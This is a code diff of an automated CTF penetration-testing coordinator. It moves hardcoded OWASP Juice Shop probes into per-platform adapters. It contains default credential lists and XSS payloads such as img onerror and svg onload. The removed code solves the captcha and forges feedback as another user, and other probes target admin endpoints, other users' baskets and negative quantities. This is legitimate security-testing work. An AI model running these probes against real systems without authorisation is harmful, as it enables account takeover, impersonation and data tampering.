@@ -12,10 +12,14 @@ import asyncio
 import base64
 import copy
 import json
+import time
 import aiohttp
 from pathlib import Path
 from typing import Dict, List, Any, Optional, Callable, Set
 from datetime import datetime
+
+from backend.core.ctf_platforms.registry import detect_platform
+from backend.core.ctf_platforms.base import CTFPlatformAdapter, ChallengeInfo
 
 try:
     from core.browser_validator import BrowserValidator, HAS_PLAYWRIGHT
@@ -73,8 +77,9 @@ class CTFCoordinator:
         self._cancelled = False
         self._recon_data = None
         self._all_findings: List[Dict] = []
-        self._baseline_solved: Set[int] = set()  # Challenge IDs solved before testing
+        self._baseline_solved: Set[Any] = set()  # Challenge IDs solved before testing
         self._harvested_auth_headers: Dict[str, str] = {}  # Auth tokens from successful logins
+        self._platform: Optional[CTFPlatformAdapter] = None  # Detected platform adapter
 
     def cancel(self):
         """Cancel all agents - called by stop_challenge endpoint."""
@@ -88,7 +93,8 @@ class CTFCoordinator:
         await self._log_callback("info", f"[PIPELINE] Multi-agent CTF pipeline starting ({self.agent_count} agents: 1 recon + {self.testing_agent_count} testers)")
 
         try:
-            # Snapshot Juice Shop challenge state before testing
+            # Detect CTF platform and snapshot challenge state before testing
+            await self._detect_platform()
             await self._snapshot_baseline()
 
             # Phase 1: Recon
@@ -307,7 +313,7 @@ class CTFCoordinator:
 
         # Run agents + periodic challenge polling concurrently
         async def periodic_challenge_poll():
-            """Poll Juice Shop /api/Challenges every 60 seconds during testing."""
+            """Poll platform challenge API every 60 seconds during testing."""
             while not self._cancelled:
                 await asyncio.sleep(60)
                 if self._cancelled:
@@ -591,7 +597,10 @@ class CTFCoordinator:
 
         # Check challenges after quick wins
         solved_after = await self._poll_challenges()
-        new_solves = len({cid for cid, c in solved_after.items() if c.get("solved")} - self._baseline_solved) if solved_after else 0
+        if self._platform and solved_after:
+            new_solves = len(self._platform.get_solved_ids(solved_after) - self._baseline_solved)
+        else:
+            new_solves = 0
         await self._log_callback("info", f"[PIPELINE] Quick Wins complete: {wins} findings, {new_solves} new challenges solved")
 
     # ── Quick-win probe implementations ──
@@ -630,12 +639,14 @@ class CTFCoordinator:
 
     async def _probe_default_creds(self, session, login_urls: List[str]) -> List[Dict]:
         """Try common default credential pairs."""
-        cred_pairs = [
-            ("admin@juice-sh.op", "admin123"),
+        # Generic credential pairs — platform-specific creds are prepended
+        generic_creds = [
             ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
             ("admin", "Password1"), ("root", "root"), ("test", "test"),
             ("admin@admin.com", "admin"), ("user", "user"), ("demo", "demo"),
         ]
+        platform_creds = self._platform.get_platform_credentials() if self._platform else []
+        cred_pairs = list(dict.fromkeys(platform_creds + generic_creds))
         findings = []
         for url in login_urls[:2]:
             for user, pw in cred_pairs:
@@ -732,7 +743,9 @@ class CTFCoordinator:
 
         # Discover search-like endpoints
         if not search_urls:
-            search_urls = [f"{base}/search", f"{base}/rest/products/search", f"{base}/api/search"]
+            platform_search = [f"{base}{p}" for p in self._platform.get_platform_search_paths()] if self._platform else []
+            generic_search = [f"{base}/search", f"{base}/api/search"]
+            search_urls = list(dict.fromkeys(platform_search + generic_search))
 
         for url in search_urls[:6]:
             parsed = url.split("?")[0]
@@ -976,9 +989,12 @@ class CTFCoordinator:
                 self._probe_authed_admin(session, base),
                 self._probe_authed_api_manipulation(session, base, api_paths[:15]),
                 self._probe_parameter_manipulation(session, base, api_paths[:15]),
-                self._probe_zero_stars(session, base),
-                self._probe_forged_feedback(session, base),
             ]
+            # Run platform-specific probes (e.g., Juice Shop captcha challenges)
+            if self._platform:
+                probes.append(self._platform.run_platform_probes(
+                    session, base, merged_headers, self._log_callback, self._recon_data,
+                ))
             results = await asyncio.gather(*probes, return_exceptions=True)
 
             wins = 0
@@ -1033,12 +1049,10 @@ class CTFCoordinator:
     async def _probe_authed_admin(self, session, base: str) -> List[Dict]:
         """Access admin-only endpoints with authenticated session."""
         findings = []
-        admin_urls = [
-            f"{base}/api/Users", f"{base}/rest/admin/application-configuration",
-            f"{base}/api/SecurityQuestions", f"{base}/api/SecurityAnswers",
-            f"{base}/api/Feedbacks", f"{base}/api/Complaints",
-            f"{base}/api/Recycles", f"{base}/api/Orders",
-            f"{base}/api/Quantitys", f"{base}/api/Deliverys",
+        # Use platform-specific API paths, fall back to generic admin endpoints
+        platform_paths = self._platform.get_platform_api_paths() if self._platform else []
+        admin_urls = [f"{base}{p}" for p in platform_paths] if platform_paths else [
+            f"{base}/api/admin", f"{base}/api/users", f"{base}/api/config",
         ]
         for url in admin_urls:
             try:
@@ -1066,7 +1080,11 @@ class CTFCoordinator:
         # Try accessing baskets/carts of other users
         basket_urls = [p for p in api_urls if any(k in p.lower() for k in ("basket", "cart", "order"))]
         if not basket_urls:
-            basket_urls = [f"{base}/rest/basket", f"{base}/api/BasketItems"]
+            field_names = self._platform.get_platform_field_names() if self._platform else {}
+            basket_paths = field_names.get("basket", [])
+            basket_urls = [f"{base}/{p}" for p in basket_paths] if basket_paths else [
+                f"{base}/api/cart", f"{base}/api/basket",
+            ]
 
         for url in basket_urls[:4]:
             base_url = url.rstrip("/")
@@ -1093,7 +1111,11 @@ class CTFCoordinator:
         # Try DELETE on feedback/reviews (common CTF pattern)
         feedback_urls = [p for p in api_urls if any(k in p.lower() for k in ("feedback", "review", "comment"))]
         if not feedback_urls:
-            feedback_urls = [f"{base}/api/Feedbacks"]
+            field_names = self._platform.get_platform_field_names() if self._platform else {}
+            fb_paths = field_names.get("feedback", [])
+            feedback_urls = [f"{base}/{p}" for p in fb_paths] if fb_paths else [
+                f"{base}/api/feedback", f"{base}/api/reviews",
+            ]
         for url in feedback_urls[:2]:
             base_url = url.rstrip("/")
             for resource_id in [1, 2]:
@@ -1117,7 +1139,11 @@ class CTFCoordinator:
         # Test feedback/rating endpoints with out-of-range values
         feedback_urls = [p for p in api_urls if any(k in p.lower() for k in ("feedback", "review", "rating", "comment"))]
         if not feedback_urls:
-            feedback_urls = [f"{base}/api/Feedbacks"]
+            field_names = self._platform.get_platform_field_names() if self._platform else {}
+            fb_paths = field_names.get("feedback", [])
+            feedback_urls = [f"{base}/{p}" for p in fb_paths] if fb_paths else [
+                f"{base}/api/feedback", f"{base}/api/reviews",
+            ]
 
         boundary_payloads = [
             {"comment": "test", "rating": 0},
@@ -1149,7 +1175,11 @@ class CTFCoordinator:
         # Test quantity manipulation on product/order endpoints
         product_urls = [p for p in api_urls if any(k in p.lower() for k in ("product", "item", "quantity", "basket"))]
         if not product_urls:
-            product_urls = [f"{base}/api/BasketItems"]
+            field_names = self._platform.get_platform_field_names() if self._platform else {}
+            basket_paths = field_names.get("basket", [])
+            product_urls = [f"{base}/{p}" for p in basket_paths] if basket_paths else [
+                f"{base}/api/cart/items", f"{base}/api/basket",
+            ]
 
         negative_payloads = [
             {"ProductId": 1, "BasketId": "1", "quantity": -1},
@@ -1178,131 +1208,6 @@ class CTFCoordinator:
                     continue
         return findings
 
-    async def _probe_zero_stars(self, session, base: str) -> Optional[Dict]:
-        """Solve the Zero Stars challenge: submit feedback with rating=0.
-
-        Juice Shop's /api/Feedbacks requires a valid captcha. We fetch one,
-        solve the simple math expression, and POST with rating=0.
-        """
-        try:
-            # Step 1: Get a captcha
-            async with session.get(f"{base}/rest/captcha/", ssl=False) as resp:
-                if resp.status != 200:
-                    return None
-                captcha_data = await resp.json()
-                captcha_id = captcha_data.get("captchaId")
-                captcha_text = captcha_data.get("captcha", "")
-
-            if not captcha_id or not captcha_text:
-                return None
-
-            # Step 2: Solve the math captcha (format: "X op Y" where op is +, -, *)
-            captcha_answer = None
-            try:
-                # Extract just the math part (remove HTML if present)
-                import re
-                math_match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
-                if math_match:
-                    a, op, b = int(math_match.group(1)), math_match.group(2), int(math_match.group(3))
-                    if op == '+':
-                        captcha_answer = a + b
-                    elif op == '-':
-                        captcha_answer = a - b
-                    elif op == '*':
-                        captcha_answer = a * b
-            except Exception:
-                return None
-
-            if captcha_answer is None:
-                return None
-
-            # Step 3: POST feedback with rating=0 (the Zero Stars exploit)
-            payload = {
-                "UserId": 1,
-                "captchaId": captcha_id,
-                "captcha": str(captcha_answer),
-                "comment": "test (***anonymous***)",
-                "rating": 0,
-            }
-            async with session.post(f"{base}/api/Feedbacks/", json=payload, ssl=False) as resp:
-                if resp.status in (200, 201):
-                    body = await resp.text()
-                    try:
-                        data = json.loads(body)
-                        if data.get("data", {}).get("id"):
-                            await self._log_callback("warning", f"[AuthProbe] Zero Stars: feedback with rating=0 accepted")
-                            finding = self._make_finding(
-                                "Zero Stars - Business Logic Bypass", "business_logic", "medium",
-                                f"{base}/api/Feedbacks/", "rating", "0",
-                                "Submitted feedback with rating=0 (bypasses 1-5 range)", "POST")
-                            finding["agent_label"] = "AuthProbe"
-                            return finding
-                    except json.JSONDecodeError:
-                        pass
-        except Exception:
-            pass
-        return None
-
-    async def _probe_forged_feedback(self, session, base: str) -> Optional[Dict]:
-        """Submit feedback as a different user (Forged Feedback challenge)."""
-        try:
-            # Get captcha first
-            async with session.get(f"{base}/rest/captcha/", ssl=False) as resp:
-                if resp.status != 200:
-                    return None
-                captcha_data = await resp.json()
-                captcha_id = captcha_data.get("captchaId")
-                captcha_text = captcha_data.get("captcha", "")
-
-            if not captcha_id or not captcha_text:
-                return None
-
-            # Solve captcha
-            import re
-            captcha_answer = None
-            math_match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
-            if math_match:
-                a, op, b = int(math_match.group(1)), math_match.group(2), int(math_match.group(3))
-                if op == '+':
-                    captcha_answer = a + b
-                elif op == '-':
-                    captcha_answer = a - b
-                elif op == '*':
-                    captcha_answer = a * b
-
-            if captcha_answer is None:
-                return None
-
-            # Post feedback as a different user (UserId != our authenticated user)
-            # Our token is typically user 1 or admin; forge as user 2
-            payload = {
-                "UserId": 2,
-                "captchaId": captcha_id,
-                "captcha": str(captcha_answer),
-                "comment": "forged feedback test (***anonymous***)",
-                "rating": 3,
-            }
-            async with session.post(f"{base}/api/Feedbacks/", json=payload, ssl=False) as resp:
-                if resp.status in (200, 201):
-                    body = await resp.text()
-                    try:
-                        data = json.loads(body)
-                        result = data.get("data", {})
-                        # Check if the UserId was accepted as 2 (different from our auth)
-                        if result.get("id") and result.get("UserId") == 2:
-                            await self._log_callback("warning", f"[AuthProbe] Forged Feedback: posted as UserId=2")
-                            finding = self._make_finding(
-                                "Forged Feedback - User Impersonation", "broken_access_control", "high",
-                                f"{base}/api/Feedbacks/", "UserId", "2",
-                                "Submitted feedback as a different user by manipulating UserId", "POST")
-                            finding["agent_label"] = "AuthProbe"
-                            return finding
-                    except json.JSONDecodeError:
-                        pass
-        except Exception:
-            pass
-        return None
-
     # ------------------------------------------------------------------
     # Phase 1.6: Browser Probes
     # ------------------------------------------------------------------
@@ -1318,7 +1223,15 @@ class CTFCoordinator:
         validator = BrowserValidator(screenshots_dir="reports/screenshots")
         await validator.start(headless=True)
         try:
-            await self._probe_ctf_challenge_triggers(validator)
+            # Platform-specific browser probes (challenge triggers, etc.)
+            if self._platform:
+                platform_findings = await self._platform.run_platform_browser_probes(
+                    validator, self.target, self._log_callback,
+                )
+                for finding in platform_findings:
+                    self._all_findings.append(finding)
+                    await self._finding_callback(finding)
+            # Generic browser probes
             await self._probe_dom_xss(validator)
             await self._probe_hidden_pages(validator)
             await self._probe_client_side_exploits(validator)
@@ -1326,64 +1239,6 @@ class CTFCoordinator:
             await self._log_callback("warning", f"[BrowserProbe] Error: {e}")
         finally:
             await validator.stop()
-
-    async def _probe_ctf_challenge_triggers(self, validator):
-        """Navigate to known Juice Shop challenge URLs to trigger Angular-based solves.
-
-        Many Juice Shop challenges are solved by simply visiting a specific SPA route.
-        The Angular frontend detects the navigation and marks the challenge as solved
-        server-side. This probe directly targets these easy wins without any filtering.
-        """
-        base = self.target.rstrip("/")
-
-        # Each entry: (url, wait_seconds, description)
-        challenge_routes = [
-            (f"{base}/#/score-board", 3, "Score Board"),
-            (f"{base}/#/privacy-security/privacy-policy", 3, "Privacy Policy"),
-            (f"{base}/#/photo-wall", 2, "Photo Wall"),
-            (f"{base}/#/deluxe-membership", 2, "Deluxe Membership"),
-            (f"{base}/#/track-result", 2, "Track Result"),
-            (f"{base}/#/accounting", 2, "Accounting"),
-        ]
-
-        # DOM XSS via search — the Angular app renders the payload in DOM,
-        # triggering the challenge solve without needing a dialog popup
-        xss_payloads = [
-            (f'{base}/#/search?q=<iframe src="javascript:alert(`xss`)">', 4, "DOM XSS (iframe)"),
-            (f'{base}/#/search?q=<img src=x onerror=alert(`xss`)>', 3, "DOM XSS (img)"),
-        ]
-
-        context = await validator.browser.new_context(
-            ignore_https_errors=True,
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
-        )
-        try:
-            page = await context.new_page()
-            # Warm up: visit homepage first to init Angular app + session
-            await page.goto(base, wait_until="networkidle", timeout=15000)
-            await asyncio.sleep(1)
-
-            solved_before = set(self._baseline_solved)
-            triggered = 0
-
-            # Visit challenge routes
-            for url, wait_s, desc in challenge_routes + xss_payloads:
-                try:
-                    await page.goto(url, wait_until="networkidle", timeout=10000)
-                    await asyncio.sleep(wait_s)
-                    triggered += 1
-                except Exception:
-                    continue
-
-            await self._log_callback("info", f"[BrowserProbe] CTF challenge triggers: visited {triggered} routes")
-
-            # Check what we solved
-            await self._check_newly_solved("challenge_triggers")
-
-        except Exception as e:
-            await self._log_callback("debug", f"[BrowserProbe] Challenge trigger error: {e}")
-        finally:
-            await context.close()
 
     async def _probe_dom_xss(self, validator):
         """Test for DOM-based XSS via URL fragments and query params."""
@@ -1393,7 +1248,8 @@ class CTFCoordinator:
             '"><svg onload=alert(1)>',
         ]
         # Prioritize search endpoints — these are the most common XSS vectors
-        search_urls = [f"{base}/search", f"{base}/rest/products/search"]
+        platform_search = [f"{base}{p}" for p in self._platform.get_platform_search_paths()] if self._platform else []
+        search_urls = list(dict.fromkeys(platform_search + [f"{base}/search"]))
         other_urls = [base]
         if self._recon_data:
             for e in self._recon_data.endpoints[:30]:
@@ -1449,20 +1305,14 @@ class CTFCoordinator:
     async def _probe_hidden_pages(self, validator):
         """Find hidden pages that only render in-browser (SPA routes, admin panels)."""
         base = self.target.rstrip("/")
-        hidden_paths = [
-            # Common SPA hash routes
-            "/#/score-board", "/#/administration", "/#/accounting",
-            "/#/privacy-security/last-login-ip", "/#/order-history",
-            "/#/recycle", "/#/complain", "/#/chatbot",
-            "/#/privacy-policy", "/#/about", "/#/tokenSale",
-            "/#/photo-wall", "/#/deluxe-membership", "/#/track-result",
-            "/#/wallet", "/#/address/saved",
-            # Generic SPA routes
+        # Platform-specific hidden paths + generic SPA/server routes
+        platform_paths = self._platform.get_platform_hidden_paths() if self._platform else []
+        generic_paths = [
             "/#/profile", "/#/settings", "/#/help", "/#/faq",
             "/#/terms", "/#/privacy", "/#/docs", "/#/leaderboard",
-            # Server-side paths
             "/admin", "/dashboard", "/debug", "/console",
         ]
+        hidden_paths = list(dict.fromkeys(platform_paths + generic_paths))
         context = await validator.browser.new_context(
             ignore_https_errors=True,
             user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
@@ -1613,92 +1463,88 @@ class CTFCoordinator:
         }
 
     # ------------------------------------------------------------------
-    # Juice Shop Challenge Tracking
+    # Platform Detection & Challenge Tracking
     # ------------------------------------------------------------------
 
-    async def _poll_challenges(self) -> Dict[int, Dict]:
-        """Poll Juice Shop /api/Challenges endpoint for challenge state."""
+    async def _detect_platform(self):
+        """Auto-detect the CTF platform via registered adapters."""
         try:
             async with aiohttp.ClientSession() as session:
-                url = f"{self.target.rstrip('/')}/api/Challenges"
-                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                    if resp.status == 200:
-                        data = await resp.json()
-                        challenges = data.get("data", [])
-                        return {c["id"]: c for c in challenges}
+                self._platform = await detect_platform(self.target, session)
+                if self._platform:
+                    await self._log_callback("info", f"[PIPELINE] Platform detected: {self._platform.platform_name}")
+                else:
+                    await self._log_callback("debug", "[PIPELINE] No specific CTF platform detected (using generic probes)")
+        except Exception as e:
+            await self._log_callback("debug", f"[PIPELINE] Platform detection error: {e}")
+
+    async def _poll_challenges(self) -> Dict[Any, ChallengeInfo]:
+        """Poll the detected platform for current challenge state."""
+        if not self._platform:
+            return {}
+        try:
+            async with aiohttp.ClientSession() as session:
+                return await self._platform.poll_challenges(self.target, session)
         except Exception as e:
             await self._log_callback("debug", f"[PIPELINE] Challenge poll failed: {e}")
         return {}
 
     async def _snapshot_baseline(self):
         """Take baseline snapshot of solved challenges before testing."""
+        if not self._platform:
+            return
         challenges = await self._poll_challenges()
         if challenges:
-            self._baseline_solved = {cid for cid, c in challenges.items() if c.get("solved")}
+            self._baseline_solved = self._platform.get_solved_ids(challenges)
             total = len(challenges)
             solved = len(self._baseline_solved)
-            await self._log_callback("info", f"[PIPELINE] Juice Shop detected: {total} challenges, {solved} pre-solved")
-        else:
-            await self._log_callback("debug", "[PIPELINE] No Juice Shop challenge API detected (not a Juice Shop target)")
+            await self._log_callback("info", f"[PIPELINE] {self._platform.platform_name} detected: {total} challenges, {solved} pre-solved")
 
     async def _check_newly_solved(self, phase_name: str = "testing"):
         """Check for newly solved challenges and register them as flags."""
-        if not self._baseline_solved and not await self._poll_challenges():
-            return  # Not a Juice Shop target
+        if not self._platform:
+            return
 
         challenges = await self._poll_challenges()
         if not challenges:
             return
 
-        current_solved = {cid for cid, c in challenges.items() if c.get("solved")}
+        current_solved = self._platform.get_solved_ids(challenges)
         newly_solved = current_solved - self._baseline_solved
 
         for cid in newly_solved:
             c = challenges[cid]
-            challenge_name = c.get("name", f"Challenge #{cid}")
-            category = c.get("category", "unknown")
-            difficulty = c.get("difficulty", 0)
+            flag_value = f"SOLVED: {c.name} [{c.category}] (difficulty: {c.difficulty})"
+            await self._log_callback("info", f"[CTF] CHALLENGE SOLVED: {c.name} ({c.category}, difficulty {c.difficulty})")
 
-            flag_value = f"SOLVED: {challenge_name} [{category}] (difficulty: {difficulty})"
-            await self._log_callback("info", f"[CTF] CHALLENGE SOLVED: {challenge_name} ({category}, difficulty {difficulty})")
-
-            # Register as a captured flag
-            if self.flag_detector and flag_value not in self.flag_detector._seen_flags:
-                import time
+            # Register as a captured flag via public API
+            if self.flag_detector:
                 from backend.core.ctf_flag_detector import CapturedFlag
                 captured = CapturedFlag(
                     flag_value=flag_value,
-                    platform="juice_shop",
+                    platform=self._platform.platform_name,
                     source="challenge_api",
-                    found_in_url=f"{self.target}/api/Challenges",
+                    found_in_url=self.target,
                     found_in_field=f"challenge_id={cid}",
                     request_method="GET",
                     request_payload="",
                     timestamp=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                 )
-                self.flag_detector._seen_flags.add(flag_value)
-                self.flag_detector.captured_flags.append(captured)
-                if self.flag_detector.first_flag_time is None:
-                    self.flag_detector.first_flag_time = time.time()
-                self.flag_detector._flag_timeline.append({
-                    "flag": flag_value[:80],
-                    "platform": "juice_shop",
-                    "elapsed_seconds": round(time.time() - self.flag_detector.start_time, 2),
-                })
+                self.flag_detector.register_flag(captured)
 
             # Update baseline so we don't count it again
             self._baseline_solved.add(cid)
 
             # Create a finding for each solved challenge
-            difficulty_severity = {1: "info", 2: "low", 3: "medium", 4: "high", 5: "critical", 6: "critical"}
-            severity = difficulty_severity.get(difficulty, "medium")
+            severity = self._platform.difficulty_to_severity(c.difficulty)
+            max_diff = c.max_difficulty
             finding = self._make_finding(
-                f"CTF Challenge Solved: {challenge_name}",
-                f"ctf_{category.lower().replace(' ', '_')}",
+                f"CTF Challenge Solved: {c.name}",
+                f"ctf_{c.category.lower().replace(' ', '_')}",
                 severity,
-                f"{self.target.rstrip('/')}/api/Challenges/{cid}",
+                self.target,
                 "challenge_id", str(cid),
-                f"Flag: {flag_value} | Category: {category} | Difficulty: {difficulty}/6",
+                f"Flag: {flag_value} | Category: {c.category} | Difficulty: {c.difficulty}/{max_diff}",
                 "GET"
             )
             finding["agent_label"] = "CTF"
